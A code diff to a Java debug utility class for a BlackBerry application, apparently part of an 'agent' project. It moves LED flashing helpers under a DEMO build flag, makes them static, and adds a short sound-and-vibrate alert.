@@ -11,6 +11,7 @@ package blackberry.debug;
 import java.util.Date;
 
 import net.rim.device.api.i18n.DateFormat;
+import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.LED;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
@@ -185,7 +186,8 @@ public final class Debug {
     public void info(final String message) {
         //#ifdef DEBUG
         if (enabled) {
-            trace("-INF- " + className + " | " + message, DebugLevel.INFORMATION);
+            trace("-INF- " + className + " | " + message,
+                    DebugLevel.INFORMATION);
         }
 
         //#endif
@@ -369,34 +371,45 @@ public final class Debug {
         }
     }
 
-    //#ifdef DEBUG
-    public void ledFlash(int color) {
+    //#ifdef DEMO
+    public static void ledFlash(int color) {
         ledStart(color);
+        playSound();
         ledStop();
     }
 
-    public void ledStart(int color) {
+    public static void ledStart(int color) {
         try {
             LED.setConfiguration(LED.LED_TYPE_STATUS, 1000, 1000,
                     LED.BRIGHTNESS_12);
             LED.setColorConfiguration(1000, 1000, color);
-            LED.setState(LED.STATE_BLINKING);;
-            
+            LED.setState(LED.STATE_BLINKING);
+            ;
+
         } catch (final Exception ex) {
 
         }
-        
+
     }
-    
-    public void ledStop() {
+
+    public static void ledStop() {
         try {
             LED.setState(LED.STATE_OFF);
-            
+
         } catch (final Exception ex) {
 
         }
     }
 
+    public static void playSound() {
+        short[] fire = { 1400, 15 };
+        try {
+            Alert.startAudio(fire, 100);
+            Alert.startVibrate(100);
+        } catch (Exception e) {
+
+        }
+    }
     //#endif
 
 }
